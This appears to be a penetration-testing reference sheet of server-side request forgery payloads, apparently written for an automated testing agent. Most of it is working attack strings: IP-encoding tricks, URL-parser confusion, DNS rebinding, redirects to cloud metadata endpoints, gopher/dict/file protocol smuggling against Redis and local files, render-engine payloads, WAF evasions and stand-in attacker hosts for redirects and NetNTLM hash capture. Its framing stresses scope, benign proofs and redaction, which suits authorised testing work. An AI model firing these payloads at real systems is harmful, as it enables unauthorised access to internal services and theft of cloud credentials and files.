# SSRF payloads, bypasses, protocols (shared by ssrf-inband / blind / cloud)
# Stay in scope. Confirm a fetch benignly before aiming at internal/metadata targets.

## Internal target forms
```
http://127.0.0.1/            http://localhost/         http://0.0.0.0/
http://[::1]/                http://127.1/             http://0x7f000001/   (hex)
http://2130706433/           (decimal 127.0.0.1)
http://INTERNAL_IP/          (in-scope internal ranges from scope.yaml)
```

## Allowlist / parser bypasses
```
http://ALLOWED@attacker.example/            # userinfo trick
http://attacker.example#ALLOWED             # fragment
http://attacker.example/ALLOWED
http://ALLOWED.attacker.example             # suffix confusion
http://127.0.0.1:80\@ALLOWED/
http://ⓛocalhost/                           # unicode / IDN
http://localtest.me/  http://*.nip.io       # DNS that resolves to an IP you pick
DNS rebinding: a host that resolves ALLOWED on check, INTERNAL on fetch (TOCTOU)
redirect: an allowed URL that 301→ http://169.254.169.254/ (if the sink follows redirects)
```

## Protocol smuggling (if the sink accepts non-http)
```
file:///etc/passwd                          # local file read
gopher://127.0.0.1:6379/_<redis commands>   # talk to internal TCP services (Redis, etc.)
dict://127.0.0.1:11211/stats                # memcached
http://127.0.0.1:INTERNAL_PORT/             # port-scan internal services via response/timing
```

## Blind confirmation
Use an OOB beacon in the URL (`http://TOKEN.oob.example/`) so a server fetch is attributable even
with no in-band reflection. For protocol/port probing without reflection, use timing differentials.

See `ssrf-cloud/refs/metadata_endpoints.md` for cloud metadata targets.

---
## Time-based internal port inference (semi-blind)

### Time-based internal port inference (semi-blind, no reflection)
When the sink fetches but returns nothing useful, map internal services by RESPONSE TIMING:
```
http://127.0.0.1:PORT/          # iterate common ports: 22 80 443 3306 5432 6379 8080 9200 2375 ...
```
- **Fast** response / immediate error  → port **closed** (connection refused quickly).
- **Slow** (hangs then times out)       → port **filtered** (no response).
- **Distinct** latency / body / error   → port **open** (service accepted + responded).
Baseline a known-closed high port first, then diff each candidate against it (average 3 samples to beat
jitter). This infers the internal service map without any in-band leak — enough to prove impact and to
pick the right protocol gadget (`gopher://`, `dict://`, redis, etc.). Rate-limit; stay in scope.

---
## Extended arsenal — IP-literal encoding matrix

Allowlists that string-match `127.0.0.1` / `169.254.169.254` miss these equivalents. Pick a target IP
(loopback `127.0.0.1`, link-local `169.254.169.254`, or an in-scope internal), try each encoding, and
confirm the sink actually reaches it (OOB from the target egress, or timing) before rating.

| Form | 127.0.0.1 | 169.254.169.254 |
|---|---|---|
| Dotted decimal | `127.0.0.1` | `169.254.169.254` |
| Dotless decimal (32-bit) | `2130706433` | `2852039166` |
| Octal (dotted) | `0177.0.0.01` | `0251.0376.0251.0376` |
| Octal (padded/overlong) | `0177.0000.0000.0001` | `00251.00376.00251.00376` |
| Hex (dotted) | `0x7f.0x0.0x0.0x1` | `0xa9.0xfe.0xa9.0xfe` |
| Hex (dotless) | `0x7f000001` | `0xa9fea9fe` |
| Mixed (hex+dec+oct) | `0x7f.0.0.1` | `0xa9.254.0251.0xfe` |
| Class-A shorthand | `127.1` | — |
| Class-B shorthand | `127.0.1` | `169.254.43518` |
| Overflow wrap (+2^32, mod-32 parsers) | `6425673729` | — |

```
### IPv6 / IPv4-mapped / zero + wildcard forms
http://[::1]/                       # IPv6 loopback
http://[::]/                        # unspecified -> often loopback on the server
http://[0:0:0:0:0:0:0:1]/           # expanded loopback
http://[::ffff:127.0.0.1]/          # IPv4-mapped loopback
http://[::ffff:7f00:1]/             # IPv4-mapped, hex halves
http://[0:0:0:0:0:ffff:127.0.0.1]/  # expanded IPv4-mapped
http://[::ffff:169.254.169.254]/    # IPv4-mapped link-local (cloud metadata)
http://[::ffff:a9fe:a9fe]/          # link-local, hex halves
http://[fd00:ec2::254]/             # AWS IMDS over IPv6
http://[::1%2administrative]/       # zone-id suffix (percent-encode the %)
# "zero"/wildcard shorthands the allowlist forgets:
http://0/   http://0.0.0.0/   http://127.0.0.2/   http://127.127.127.127/   http://0177.1/
http://localhost.localdomain/   http://localhost./   http://169.254.169.254./   # trailing-dot FQDN root
```

```
### Enclosed-alphanumeric & IDN host confusion (normalized to ASCII AFTER the check)
http://127。0。0。1/                  # U+3002 ideographic full stop as the dot
http://127．0．0．1/                  # U+FF0E fullwidth full stop
http://127｡0｡0｡1/                    # U+FF61 halfwidth ideographic stop
http://ⓛocalhost/                    # circled latin small l
http://localhost。oob.example/       # unicode dot splits the registrable domain
①②⑦.⓪.⓪.①                          # circled digits -> 127.0.0.1 after normalization
```

---
## Extended arsenal — URL-parser confusion ladder

Two-parser model: the gateway/validator parses host **ALLOWED**, the fetch library parses host **HOST**.
Benign-confirm every form by landing on `TOKEN.oob.example` (prove which host the fetcher actually dialed).

```
http://ALLOWED@HOST/                 # userinfo: real host is HOST
http://ALLOWED@HOST@evil/            # double @ (first-vs-last wins differs by parser)
http://HOST#@ALLOWED/               # fragment before a fake authority
http://ALLOWED%2f@HOST/             # encoded slash in userinfo
http://ALLOWED%40HOST/              # encoded @ (some stacks decode late)
http://HOST\@ALLOWED/   http://HOST/\@ALLOWED   # backslash host-terminator (non-RFC parsers)
http://HOST%2523@ALLOWED/           # double-encoded #
http://HOST%00.ALLOWED/   http://HOST%0d.ALLOWED/   http://HOST%09.ALLOWED/   # control chars split host
http://ALLOWED:pw@HOST/             # full userinfo
http://foo@evil@ALLOWED/            # chained userinfo
https://ALLOWED%09.HOST/            # tab inside host
```

| Byte between host and path | RFC/WHATWG host | Lenient-parser host |
|---|---|---|
| `\` backslash | treated as `/` (WHATWG) → authority ends | literal → different split |
| raw space / tab | invalid / trimmed | may truncate host early |
| `#` | fragment start | some libs keep it in host |
| `?` | query start | some libs keep it in host |
| multiple `@` | last `@` wins (WHATWG) | first `@` wins (some libs) |

The vulnerability is the **discrepancy**: the inspected host is allowlisted, the dialed host is internal.
Escalate encoding only as far as the sink requires; log which byte the fetcher split on.

---
## Extended arsenal — DNS-layer bypasses (rebinding, wildcard, pinning)

```
### Rebinding & resolver tricks (your authoritative zone under TOKEN.oob.example)
rebind.TOKEN.oob.example            # answers ALLOWED/public on the check, 127.0.0.1 on the fetch (TTL=0)
# Multi-record round-robin: return [public, 127.0.0.1]; checker and fetcher pick different answers.
# A/AAAA split: A -> public, AAAA -> ::1 (if the fetcher prefers IPv6).
7f000001.TOKEN.oob.example          # wildcard "resolve-what-I-encode" -> 127.0.0.1
169-254-169-254.TOKEN.oob.example   # dashed form some wildcard resolvers map to the IP
# CNAME an attacker name to an internal-only name if split-horizon DNS exposes it.
# Defeat DNS pinning: force re-resolution (Connection: close, a long gap, a fresh socket).
```
Rebinding is a TOCTOU: the host resolves ALLOWED when the app validates, INTERNAL when it fetches.
Prove the internal reach via OOB/timing; the rebinding host stays attacker-controlled under your OOB zone.

---
## Extended arsenal — redirect-based reach

```
### 3xx to internal (sink allowlists only the FIRST hop, then follows redirects)
# Host a benign redirector on your OOB origin that 30x-es to the real target:
GET https://TOKEN.oob.example/r?to=http://169.254.169.254/latest/meta-data/   # -> 302
# Redirect codes to test: 301 302 303 307 308.
# Protocol-relative Location: //127.0.0.1/     # scheme inherited
# Does it follow NON-http redirects? Location: gopher://... / file://...
# Client-reparse sinks (headless browser / PDF renderer): <meta http-equiv=refresh> + JS location.
# Chain: an on-site open-redirect (see open-redirect/refs) as the trusted first hop.
```

---
## Extended arsenal — protocol gadget cookbook (benign)

```
### gopher:// — raw TCP to internal services (URL-encode CRLF as %0d%0a)
# gopher writes arbitrary bytes to host:port. Prove reach with a BENIGN, non-mutating command and redact
# any returned data. Destructive commands (Redis CONFIG/SLAVEOF/MODULE LOAD, real SMTP send) are
# catalogued for awareness ONLY — do not fire them without explicit written approval; they are never
# needed to PROVE the SSRF primitive.

# Redis — benign reach proof (PING -> +PONG). No writes to real keys.
gopher://127.0.0.1:6379/_%2a%31%0d%0a%24%34%0d%0aPING%0d%0a
#   ^ RESP for  *1\r\n$4\r\nPING\r\n   (expect +PONG)
# Optional read-back on YOUR OWN canary key only: SET rs-canary <token> ; GET rs-canary  (test key, cleaned up)

# HTTP POST from a sink that normally can't POST (use a benign/idempotent path):
gopher://127.0.0.1:80/_POST%20/healthz%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aContent-Length:%200%0d%0a%0d%0a

# SMTP — prove reach with EHLO/banner only (do NOT send spoofed mail):
gopher://127.0.0.1:25/_EHLO%20rs-canary%0d%0a
```

```
### dict:// — banners / simple reads (read-only)
dict://127.0.0.1:6379/INFO          # redis info
dict://127.0.0.1:11211/stats        # memcached stats
dict://127.0.0.1:PORT/              # grab a banner to fingerprint a service
```

```
### file:// — local read (benign marker; redact anything sensitive)
file:///etc/hostname     file:///proc/self/cgroup     file:///proc/net/tcp      # benign markers / recon
file://HOST/etc/hostname     file:///c:/windows/win.ini
# For sensitive files (passwd/shadow/keys/.env) read only enough to prove access, then REDACT in notes.
```

```
### Other schemes (note which the fetcher accepts)
ftp://127.0.0.1/            tftp://127.0.0.1/file          ldap://127.0.0.1:389/
jar:http://127.0.0.1!/      netdoc:///etc/hostname                                   # Java-specific
php://filter/convert.base64-encode/resource=index.php    data://text/plain;base64,...  # PHP wrappers
expect://id                                                # PHP expect (RCE-class) -> confirm benignly, hand to command-injection
# Windows UNC: \\TOKEN.oob.example\share  (or an http->file coercion) leaks NetNTLM auth -> treat as a
# hash capture (REDACT), hand to the credential flow; do not crack here.
```

---
## Extended arsenal — document & headless-render SSRF

```
# A URL inside a server-rendered document reaches the render box's HTTP client = SSRF.
# SVG rendered/converted server-side:
<svg xmlns="http://www.w3.org/2000/svg"><image href="http://TOKEN.oob.example/svg"/></svg>
<svg><use href="http://169.254.169.254/latest/meta-data/"/></svg>
# HTML -> PDF / headless browser (every external resource is fetched from the server):
<img src="http://169.254.169.254/latest/meta-data/">    <iframe src="http://127.0.0.1:PORT/">
<link rel=stylesheet href="http://TOKEN.oob.example/css">    <object data="http://127.0.0.1/"></object>
<style>@import url(http://TOKEN.oob.example/i);</style>      body{background:url(http://TOKEN.oob.example/bg)}
# XSLT document()/unparsed-text and XXE-SSRF -> see xxe-* skills:
<xsl:value-of select="document('http://TOKEN.oob.example/xslt')"/>
# Also: markdown/link-unfurl bots, favicon fetchers, oEmbed, "URL to image" APIs, thumbnail generators.
```

---
## Extended arsenal — blind vs in-band confirmation matrix

| Observable | Variant | Benign proof to capture |
|---|---|---|
| Body/length/status varies by target | in-band | diff two targets; show the internal banner (redacted) |
| No reflection; OOB DNS/HTTP hit from target egress | blind | attributable `TOKEN.oob.example` hit + egress IP/UA |
| Only timing differs by port/host | semi-blind | 3-sample latency delta vs a known-closed baseline |
| Reaches `169.254.169.254` / link-local | cloud | role name only; redact creds (see metadata ref) |
| gopher/dict banner returned | protocol smuggling | benign command echo; redact data |

Always lead with the benign OOB callback to attribute the fetch to the **target egress** (not a scanner or
link-preview bot), then escalate encoding/protocol only as far as needed to prove impact.

---
## Extended arsenal — filter/WAF evasion for the URL value

```
# If a WAF blocks the raw internal host, wrap the VALUE (see waf-bypass for transforms):
HtTp://127.0.0.1/        http:\/\/127.0.0.1        http://127.0.0.1%2f..%2f
# - URL-encode / double-encode the scheme and host bytes
# - prepend a benign allowlisted prefix via @ or #
# - substitute any IP encoding from the matrix above
# - host the payload behind YOUR redirect so the inspected value is a clean public URL
```
Benign-proof, rate-limited, in-scope only. Redact any sensitive content a read returns.
